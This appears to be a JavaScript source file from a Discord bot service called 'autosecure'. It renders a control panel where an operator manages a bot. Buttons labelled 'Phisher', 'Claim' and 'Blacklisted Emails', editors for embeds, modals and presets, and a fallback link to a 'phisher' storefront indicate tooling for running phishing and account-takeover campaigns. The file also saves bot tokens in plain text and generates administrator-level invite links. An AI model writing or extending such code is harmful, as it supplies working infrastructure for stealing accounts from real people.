const { queryParams } = require("../../../db/database");
const { autosecureMap } = require("../../../mainbot/handlers/botHandler");
const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require("discord.js");
const generate = require("../utils/generate");

module.exports = async function showbotmsg(userid, botnumber, id, client) {
    let hidebuttons = false;
    const result = await queryParams(
        'SELECT * FROM autosecure WHERE user_id = ? AND botnumber = ?',
        [id, botnumber]
    );

    if (!result || result.length === 0) {
        return {
            content: "Bot not found in database (report this please!)",
            ephemeral: true
        };
    }

    let d = `${id}|${botnumber}`;
    let c = await autosecureMap.get(d);
    if (client.isuserbot) hidebuttons = true;

    let botTag = "Unknown";
    if (c) {
        botTag = c.user.tag;
        await queryParams(
            'UPDATE autosecure SET lastsavedname = ? WHERE user_id = ? AND botnumber = ?',
            [botTag, id, botnumber]
        );
    } else {
        const offlineResult = await queryParams(
            'SELECT lastsavedname FROM autosecure WHERE user_id = ? AND botnumber = ?',
            [id, botnumber]
        );
        if (offlineResult.length > 0) {
            botTag = `${offlineResult[0].lastsavedname} (last saved)`;
        }
    }

    const creationDate = new Date(result[0].creationdate * 1000);
    const formattedDate = creationDate.toISOString().replace('T', ' ').slice(0, 19);
    
    const botUptime = c ? c.uptime : 0;
    const sessionStartTime = Math.floor((Date.now() - botUptime) / 1000);

    const embed = new EmbedBuilder()
        .setTitle(`You are currently managing: ${botTag}`)
        .setAuthor({
            name: botTag,
            iconURL: c ? c.user.displayAvatarURL() : 
            "https://media.tenor.com/ZlZZTd366EYAAAAe/we-have-no-sappers-dog-accepting-fate.png"
        })
        .setThumbnail(
            c ? c.user.displayAvatarURL() : 
            "https://media.tenor.com/ZlZZTd366EYAAAAe/we-have-no-sappers-dog-accepting-fate.png"
        )
        .setColor(16777215)
        .addFields([
            {
                name: "Session Time\n",
                value: c ? `<t:${sessionStartTime}:R>` : "`Bot Offline`",
                inline: true
            },
            {
                name: "Creation Date\n",
                value: `\`\`\`\n${formattedDate}\n\`\`\``,
                inline: true
            }
        ])

    if (!c) {
        embed.setDescription("The bot is currently offline. Restart it or replace token if needed! > Edit Bot");
    }

    let generatedid = generate(32);
    const save = `restart|${id}|${botnumber}|${result[0].token}|${c ? 'offline' : 'online'}`;
    await queryParams(`INSERT INTO actions (id, action) VALUES (?, ?)`, [generatedid, save]);

    const inviteLink = c ? 
        `https://discord.com/oauth2/authorize?client_id=${c.user.id}&permissions=8&scope=bot+applications.commands` : 
        null;

    // First row of buttons
    const row = new ActionRowBuilder();
    
    // Only add Invite Bot button if the user is the owner
    if (userid === id) {
        row.addComponents(
            new ButtonBuilder()
                .setLabel('Invite Bot')
                .setStyle(ButtonStyle.Link)
                .setURL(inviteLink || "https://phisher.mysellauth.com/")
                .setDisabled(!c)
        );
    }
    
    // Add the rest of the buttons
    row.addComponents(
        new ButtonBuilder()
            .setLabel("Edit Bot")
            .setStyle(ButtonStyle.Primary)
            .setCustomId(`editbot|${botnumber}|${id}|${hidebuttons ? 1 : 0}`),
        new ButtonBuilder()
            .setLabel("Autosecure")
            .setStyle(ButtonStyle.Primary)
            .setCustomId(`editautosecure|${botnumber}|${id}`),
        new ButtonBuilder()
            .setLabel("Phisher")
            .setStyle(ButtonStyle.Primary)
            .setCustomId(`editphisher|${botnumber}|${id}`),
        new ButtonBuilder()
            .setLabel("Claim")
            .setStyle(ButtonStyle.Primary)
            .setCustomId(`claimusers|${botnumber}|${id}`)
    );

    const row2 = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
            .setLabel("Edit Embeds")
            .setStyle(ButtonStyle.Primary)
            .setCustomId(`editembeds|${botnumber}|${id}`),
        new ButtonBuilder()
            .setLabel("Edit Buttons")
            .setStyle(ButtonStyle.Primary)
            .setCustomId(`editbuttons|${botnumber}|${id}`),
        new ButtonBuilder()
            .setLabel("Edit Modals")
            .setStyle(ButtonStyle.Primary)
            .setCustomId(`editmodals|${botnumber}|${id}`),
        new ButtonBuilder()
            .setLabel("Edit Presets")
            .setStyle(ButtonStyle.Primary)
            .setCustomId(`editpresets|${botnumber}|${id}`)
    );


    const row3 = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
            .setLabel("Blacklisted users")
            .setStyle(ButtonStyle.Success)
            .setCustomId(`blacklistedusers|${botnumber}|${id}`),
        new ButtonBuilder() 
            .setLabel('Blacklisted Emails')
            .setStyle(ButtonStyle.Success)
            .setCustomId(`blacklistedemails|${botnumber}|${id}`)
    );

    if (!hidebuttons) {
        row3.addComponents(
            new ButtonBuilder()
                .setLabel("Download config")
                .setStyle(ButtonStyle.Secondary)
                .setCustomId(`botsconfig|${botnumber}|${id}`)
        );
    }

    const components = [row, row2, row3];

    return {
        content: null,
        embeds: [embed],
        components,
        ephemeral: true
    };
};